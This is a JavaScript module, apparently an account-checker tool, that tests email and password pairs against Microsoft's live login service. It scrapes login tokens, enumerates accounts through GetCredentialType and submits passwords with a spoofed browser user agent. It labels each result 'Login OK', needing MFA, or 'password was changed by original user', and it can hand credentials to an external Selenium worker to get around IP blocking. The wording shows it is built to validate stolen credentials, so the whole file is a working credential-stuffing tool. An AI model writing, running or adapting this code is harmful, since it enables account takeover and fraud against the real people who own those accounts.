/**
 * Microsoft account checker
 * Status mapping (user-facing):
 *  - Email not exist → "This Email doesn't exist"
 *  - Needs code / other ways / not password-loginable → "Not loginable"
 *  - Wrong password → "password was changed by original user"
 *  - OK → "Login OK"
 */
const UA =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

const MSG = {
  NO_EMAIL: "This Email doesn't exist",
  NOT_LOGINABLE: 'Not loginable',
  PASS_CHANGED: 'password was changed by original user',
  OK: 'Login OK',
  BLOCKED: 'Microsoft blocked this check (datacenter IP). Set PASS_WORKER_URL for full browser check.'
};

function cleanEmail(e) {
  return String(e || '').trim().toLowerCase();
}

function cookieHeader(setCookieList) {
  if (!setCookieList || !setCookieList.length) return '';
  return setCookieList.map((c) => String(c).split(';')[0].trim()).filter(Boolean).join('; ');
}

function mergeCookies(existing, setCookieList) {
  const map = {};
  String(existing || '')
    .split(';')
    .map((s) => s.trim())
    .filter(Boolean)
    .forEach((p) => {
      const i = p.indexOf('=');
      if (i > 0) map[p.slice(0, i)] = p.slice(i + 1);
    });
  (setCookieList || []).forEach((c) => {
    const part = String(c).split(';')[0];
    const i = part.indexOf('=');
    if (i > 0) map[part.slice(0, i).trim()] = part.slice(i + 1).trim();
  });
  return Object.entries(map)
    .map(([k, v]) => k + '=' + v)
    .join('; ');
}

function extractBetween(html, re) {
  const m = html.match(re);
  return m ? m[1] : '';
}

async function loadLoginPage() {
  const url =
    'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=161&id=292841&wreply=https%3a%2f%2faccount.microsoft.com%2f%3fref%3dME' +
    'A&lc=1033&mkt=en-US';
  const res = await fetch(url, {
    headers: {
      'User-Agent': UA,
      Accept: 'text/html,application/xhtml+xml',
      'Accept-Language': 'en-US,en;q=0.9'
    },
    redirect: 'follow'
  });
  const html = await res.text();
  let cookies = '';
  try {
    cookies = cookieHeader(res.headers.getSetCookie ? res.headers.getSetCookie() : []);
  } catch (_) {}
  // Also parse set-cookie if raw
  const rawSc = res.headers.get('set-cookie');
  if (rawSc && !cookies) cookies = rawSc.split(/,(?=[^;]+?=)/).map((x) => x.split(';')[0]).join('; ');

  const ppft =
    extractBetween(html, /name="PPFT"[^>]*value="([^"]+)"/i) ||
    extractBetween(html, /sFTTag:'[^']*value="([^"]+)"/i) ||
    extractBetween(html, /"sFT":"([^"]+)"/i) ||
    extractBetween(html, /sFT:'([^']+)'/i);

  let urlPost =
    extractBetween(html, /urlPost:"([^"]+)"/i) ||
    extractBetween(html, /urlPost:'([^']+)'/i) ||
    'https://login.live.com/ppsecure/post.srf';
  urlPost = urlPost.replace(/\\u0026/g, '&').replace(/\\\//g, '/');

  const flowToken =
    extractBetween(html, /"sFT":"([^"]+)"/i) ||
    extractBetween(html, /sFT:'([^']+)'/i) ||
    ppft;

  return { html, cookies, ppft, urlPost, flowToken, status: res.status };
}

async function getCredentialType(email, flowToken, cookies) {
  const url = 'https://login.live.com/GetCredentialType.srf?opid=&id=292841&mkt=EN-US';
  const payload = {
    checkPhones: true,
    country: '',
    federationFlags: 3,
    flowToken: flowToken || '',
    forceotclogin: false,
    isCookieBannerShown: false,
    isExternalFederationDisallowed: false,
    isFidoSupported: true,
    isOtherIdpSupported: true,
    isRemoteConnectSupported: false,
    isRemoteNGCSupported: true,
    isSignup: false,
    isAccessPassSupported: true,
    otclogindisallowed: false,
    uaid: '',
    username: email
  };
  const res = await fetch(url, {
    method: 'POST',
    headers: {
      'User-Agent': UA,
      'Content-Type': 'application/json; charset=utf-8',
      Accept: 'application/json',
      Cookie: cookies || '',
      Origin: 'https://login.live.com',
      Referer: 'https://login.live.com/'
    },
    body: JSON.stringify(payload)
  });
  const data = await res.json().catch(() => null);
  let nextCookies = cookies;
  try {
    nextCookies = mergeCookies(cookies, res.headers.getSetCookie ? res.headers.getSetCookie() : []);
  } catch (_) {}
  return { data, cookies: nextCookies, http: res.status };
}

/**
 * Map GetCredentialType → user message
 * IfExistsResult: 0 exists, 1 not exist, 2 federated?, 4 throttled, 5 both, 6 consumer
 */
function mapExists(data) {
  if (!data || data.IfExistsResult === undefined || data.IfExistsResult === null) {
    return { known: false, exists: null, msg: null };
  }
  const code = Number(data.IfExistsResult);
  if (code === 1 || code === 4) {
    return { known: true, exists: false, msg: MSG.NO_EMAIL, code };
  }
  // Federated / remote NGC only / no password credential
  const creds = data.Credentials || {};
  if (creds.FederationRedirectUrl) {
    return { known: true, exists: true, msg: MSG.NOT_LOGINABLE, code, federated: true };
  }
  // HasRemoteNGC / prefer authenticator without password
  if (creds.PrefCredential === 1 && creds.HasPassword === false) {
    return { known: true, exists: true, msg: MSG.NOT_LOGINABLE, code };
  }
  if (code === 0 || code === 2 || code === 5 || code === 6) {
    return { known: true, exists: true, msg: null, code };
  }
  return { known: true, exists: true, msg: null, code };
}

async function postPassword(email, password, page) {
  if (!page.ppft) {
    return { ok: false, msg: MSG.BLOCKED, stage: 'page' };
  }
  const form = new URLSearchParams();
  form.set('i13', '0');
  form.set('login', email);
  form.set('loginfmt', email);
  form.set('type', '11');
  form.set('LoginOptions', '3');
  form.set('lrt', '');
  form.set('lrtPartition', '');
  form.set('hisRegion', '');
  form.set('hisScaleUnit', '');
  form.set('passwd', password);
  form.set('ps', '2');
  form.set('psRNGCDefaultType', '');
  form.set('psRNGCEntropy', '');
  form.set('psRNGCSLK', '');
  form.set('canary', '');
  form.set('ctx', '');
  form.set('hpgrequestid', '');
  form.set('PPFT', page.ppft);
  form.set('PPSX', 'Passp');
  form.set('NewUser', '1');
  form.set('FoundMSAs', '');
  form.set('fspost', '0');
  form.set('i21', '0');
  form.set('CookieDisclosure', '0');
  form.set('IsFidoSupported', '1');
  form.set('isSignupPost', '0');
  form.set('isRecoveryAttemptPost', '0');
  form.set('i19', '16000');

  const res = await fetch(page.urlPost, {
    method: 'POST',
    headers: {
      'User-Agent': UA,
      'Content-Type': 'application/x-www-form-urlencoded',
      Cookie: page.cookies || '',
      Origin: 'https://login.live.com',
      Referer: 'https://login.live.com/login.srf'
    },
    body: form.toString(),
    redirect: 'manual'
  });

  const loc = res.headers.get('location') || '';
  const html = await res.text().catch(() => '');
  const lower = (html + ' ' + loc).toLowerCase();

  // Success indicators
  if (
    /account\.microsoft\.com|onedrive\.live\.com|office\.com|www\.office\.com/i.test(loc) ||
    (res.status >= 300 && res.status < 400 && /wreply|oauth20|completesignin/i.test(loc))
  ) {
    // Might still be proof
    if (/proofs|identity\/confirm|recover|auth\/full|otp|onetimecode|securitycode/i.test(loc + html)) {
      return { ok: false, msg: MSG.NOT_LOGINABLE, stage: 'proof', loc };
    }
    return { ok: true, msg: MSG.OK, stage: 'password', loc };
  }

  // Not loginable: code / other ways / authenticator
  if (
    /other.?way|sign in another way|use.?a.?code|one.?time.?code|authenticator|approve.?sign.?in|send.?a.?code|text.?a.?code|help us secure|verify.?your.?identity|add.?security|two.?step|2fa|mfa|security.?info/i.test(
      lower
    )
  ) {
    return { ok: false, msg: MSG.NOT_LOGINABLE, stage: 'alt_auth' };
  }

  // Wrong password
  if (
    /password is incorrect|account or password is incorrect|doesn'?t exist.*password|incorrect password|wrong password|sErrorCode["\s:]*["']?80041012|80041012|AADSTS50126|passworderror/i.test(
      lower
    )
  ) {
    return { ok: false, msg: MSG.PASS_CHANGED, stage: 'password' };
  }

  // Account locked / disabled
  if (/locked|suspended|disabled|blocked|too many/i.test(lower)) {
    return { ok: false, msg: MSG.NOT_LOGINABLE, stage: 'locked' };
  }

  // Still on login page with generic fail
  if (res.status === 200 && /name="passwd"|type="password"/i.test(html)) {
    const extracted = extractMsError(html);
    if (extracted && /incorrect|wrong|not match/i.test(extracted)) {
      return { ok: false, msg: MSG.PASS_CHANGED, stage: 'password', raw: extracted };
    }
    if (extracted && /code|other way|verify|identity/i.test(extracted)) {
      return { ok: false, msg: MSG.NOT_LOGINABLE, stage: 'alt_auth', raw: extracted };
    }
    // Default wrong password when form redisplays after post
    return { ok: false, msg: MSG.PASS_CHANGED, stage: 'password', raw: extracted };
  }

  return {
    ok: false,
    msg: extractMsError(html) || MSG.BLOCKED,
    stage: 'unknown',
    http: res.status
  };
}

function extractMsError(html) {
  if (!html) return null;
  const regs = [
    new RegExp('id="passwordError"[^>]*>([^<]+)<', 'i'),
    new RegExp('id="usernameError"[^>]*>([^<]+)<', 'i'),
    new RegExp('"sErrorCode"\\s*:\\s*"([^"]+)"', 'i'),
    new RegExp('role="alert"[^>]*>([^<]+)<', 'i')
  ];
  for (const re of regs) {
    const m = html.match(re);
    if (m && m[1] && m[1].trim().length > 2) {
      return m[1]
        .trim()
        .replace(/&amp;/g, '&')
        .replace(/&#39;/g, "'")
        .replace(/&quot;/g, '"');
    }
  }
  return null;
}

async function tryWorkerCheck(email, password) {
  const base = String(process.env.PASS_WORKER_URL || '').replace(/\/$/, '');
  if (!base) return null;
  try {
    const res = await fetch(base + '/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, type: 'check' })
    });
    const data = await res.json().catch(() => ({}));
    return data;
  } catch (e) {
    return { error: e.message };
  }
}

function mapWorker(data) {
  if (!data) return null;
  if (data.status === 'success' || data.ok === true) {
    return { ok: true, summary: MSG.OK, error: null };
  }
  const err = String(data.error || data.message || data.result || '').toLowerCase();
  if (!err) return null;
  if (/not exist|doesn't exist|does not exist|ifexists|unknown user|no account/i.test(err)) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL };
  }
  if (/code|2fa|mfa|authenticator|other way|proof|identity|not loginable/i.test(err)) {
    return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE };
  }
  if (/incorrect|wrong password|password/i.test(err)) {
    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED };
  }
  return { ok: false, summary: data.error || data.message, error: data.error || data.message };
}

/**
 * @returns {{ ok: boolean, summary: string, error: string|null, details: object }}
 */
async function checkMicrosoft(email, password) {
  email = cleanEmail(email);
  password = String(password || '');
  const details = {};

  if (!email || !email.includes('@')) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
  }
  if (!password) {
    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED, details };
  }

  // Worker (Selenium) preferred
  const worker = await tryWorkerCheck(email, password);
  if (worker) {
    details.worker = worker;
    const mapped = mapWorker(worker);
    if (mapped) return { ...mapped, details };
  }

  // HTTP flow
  let page;
  try {
    page = await loadLoginPage();
    details.pageStatus = page.status;
    details.hasPpft = !!page.ppft;
  } catch (e) {
    return { ok: false, summary: MSG.BLOCKED, error: MSG.BLOCKED, details: { loadError: e.message } };
  }

  // Existence check
  try {
    const ct = await getCredentialType(email, page.flowToken || page.ppft, page.cookies);
    details.credentialType = ct.data;
    page.cookies = ct.cookies || page.cookies;
    const ex = mapExists(ct.data);
    details.exists = ex;
    if (ex.known && ex.exists === false) {
      return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
    }
    if (ex.msg === MSG.NOT_LOGINABLE) {
      return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
    }
  } catch (e) {
    details.ctError = e.message;
  }

  // Password post
  try {
    const pw = await postPassword(email, password, page);
    details.password = pw;
    if (pw.ok) {
      return { ok: true, summary: MSG.OK, error: null, details };
    }
    // Normalize to the 3 messages
    let msg = pw.msg || MSG.PASS_CHANGED;
    if (msg === MSG.BLOCKED && details.exists && details.exists.exists === true) {
      // Had existence but couldn't complete form — still report blocked
      msg = MSG.BLOCKED;
    }
    return { ok: false, summary: msg, error: msg, details };
  } catch (e) {
    return {
      ok: false,
      summary: MSG.BLOCKED,
      error: MSG.BLOCKED,
      details: { ...details, postError: e.message }
    };
  }
}

module.exports = { checkMicrosoft, MSG };
